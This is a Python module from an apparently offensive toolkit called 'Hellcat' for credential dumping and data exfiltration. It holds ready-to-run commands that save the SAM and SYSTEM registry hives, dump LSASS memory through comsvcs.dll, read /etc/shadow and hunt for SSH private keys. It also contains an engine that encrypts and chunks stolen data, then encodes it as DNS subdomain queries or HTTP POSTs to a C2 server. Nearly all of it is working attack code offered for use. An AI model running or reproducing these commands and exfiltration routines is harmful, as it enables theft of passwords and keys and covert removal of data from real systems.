"""
Hellcat Credential Dumping & Data Exfiltration
===============================================
Credential harvesting (SAM/LSASS/Kerberos) and encrypted data exfil
via DNS/ICMP/HTTP/SMB channels with chunked transfer.
"""
from __future__ import annotations

import base64
import logging
import os
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional

logger = logging.getLogger("hellcat.exfil")


# ---------------------------------------------------------------------------
# Credential Dump Techniques
# ---------------------------------------------------------------------------

CRED_DUMP_TECHNIQUES: List[Dict[str, Any]] = [
    {
        "name": "sam_dump",
        "description": "Dump SAM database (local accounts)",
        "os": "windows",
        "requires_admin": True,
        "command": 'reg save HKLM\\SAM C:\\Windows\\Temp\\sam.save && reg save HKLM\\SYSTEM C:\\Windows\\Temp\\sys.save',
        "mitre": "T1003.002",
    },
    {
        "name": "lsass_dump",
        "description": "Dump LSASS process memory",
        "os": "windows",
        "requires_admin": True,
        "command": 'rundll32.exe comsvcs.dll MiniDump {pid} C:\\Windows\\Temp\\lsass.dmp full',
        "mitre": "T1003.001",
    },
    {
        "name": "kerberos_tickets",
        "description": "Export Kerberos tickets from memory",
        "os": "windows",
        "requires_admin": False,
        "command": "klist",
        "mitre": "T1558.003",
    },
    {
        "name": "shadow_dump",
        "description": "Read /etc/shadow for password hashes",
        "os": "linux",
        "requires_admin": True,
        "command": "cat /etc/shadow",
        "mitre": "T1003.008",
    },
    {
        "name": "ssh_keys_harvest",
        "description": "Collect SSH private keys",
        "os": "linux",
        "requires_admin": False,
        "command": "find / -name 'id_rsa' -o -name 'id_ed25519' -o -name 'id_ecdsa' 2>/dev/null",
        "mitre": "T1552.004",
    },
    {
        "name": "browser_creds",
        "description": "Extract saved browser credentials",
        "os": "both",
        "requires_admin": False,
        "command": None,  # Requires specialized tool
        "mitre": "T1555.003",
    },
    {
        "name": "credential_spray",
        "description": "Password spray against discovered accounts",
        "os": "both",
        "requires_admin": False,
        "command": None,  # Uses hydra/netexec
        "mitre": "T1110.003",
    },
]


class CredentialDumper:
    """Credential harvesting utilities."""

    @staticmethod
    def get_techniques(os_type: str = "all", admin_only: bool = False) -> List[Dict[str, Any]]:
        result = CRED_DUMP_TECHNIQUES
        if os_type != "all":
            result = [t for t in result if t["os"] in (os_type, "both")]
        if admin_only:
            result = [t for t in result if t["requires_admin"]]
        return result

    @staticmethod
    def generate_command(technique_name: str, **kwargs: Any) -> Optional[str]:
        for t in CRED_DUMP_TECHNIQUES:
            if t["name"] == technique_name:
                cmd = t.get("command")
                if cmd and kwargs:
                    for k, v in kwargs.items():
                        cmd = cmd.replace(f"{{{k}}}", str(v))
                return cmd
        return None


# ---------------------------------------------------------------------------
# Data Exfiltration Channels
# ---------------------------------------------------------------------------

@dataclass
class ExfilConfig:
    channel: str = "http"            # http, dns, icmp, smb
    encryption: str = "aes256"       # aes256, xor, none
    chunk_size: int = 4096           # bytes per chunk
    delay: float = 0.5              # seconds between chunks
    destination: str = ""            # C2 URL / DNS domain / SMB share
    key: bytes = field(default_factory=lambda: os.urandom(32))


class DataExfiltrator:
    """Encrypted data exfiltration engine."""

    def __init__(self, config: Optional[ExfilConfig] = None) -> None:
        self.config = config or ExfilConfig()

    def prepare_data(self, data: bytes) -> List[bytes]:
        """Encrypt and chunk data for exfiltration."""
        encrypted = self._encrypt(data)
        chunks = []
        for i in range(0, len(encrypted), self.config.chunk_size):
            chunks.append(encrypted[i:i + self.config.chunk_size])
        return chunks

    def _encrypt(self, data: bytes) -> bytes:
        if self.config.encryption == "none":
            return data
        if self.config.encryption == "xor":
            k = self.config.key
            return bytes(b ^ k[i % len(k)] for i, b in enumerate(data))
        # AES-256-GCM
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            nonce = os.urandom(12)
            ct = AESGCM(self.config.key[:32]).encrypt(nonce, data, None)
            return nonce + ct
        except ImportError:
            # Fallback to XOR
            k = self.config.key
            return bytes(b ^ k[i % len(k)] for i, b in enumerate(data))

    def generate_dns_queries(self, data: bytes, domain: str) -> List[str]:
        """Encode data as DNS subdomain queries."""
        encoded = base64.b32encode(data).decode().rstrip("=").lower()
        queries = []
        # Max label length 63, use 50 to be safe
        for i in range(0, len(encoded), 50):
            chunk = encoded[i:i+50]
            queries.append(f"{chunk}.{i//50}.{domain}")
        return queries

    def generate_http_requests(self, chunks: List[bytes], url: str) -> List[Dict[str, Any]]:
        """Generate HTTP POST requests for each chunk."""
        requests = []
        for i, chunk in enumerate(chunks):
            requests.append({
                "method": "POST",
                "url": url,
                "headers": {"X-Chunk-Id": str(i), "X-Total": str(len(chunks))},
                "data": base64.b64encode(chunk).decode(),
            })
        return requests

    def get_channel_info(self) -> Dict[str, Any]:
        return {
            "channel": self.config.channel,
            "encryption": self.config.encryption,
            "chunk_size": self.config.chunk_size,
            "delay": self.config.delay,
        }
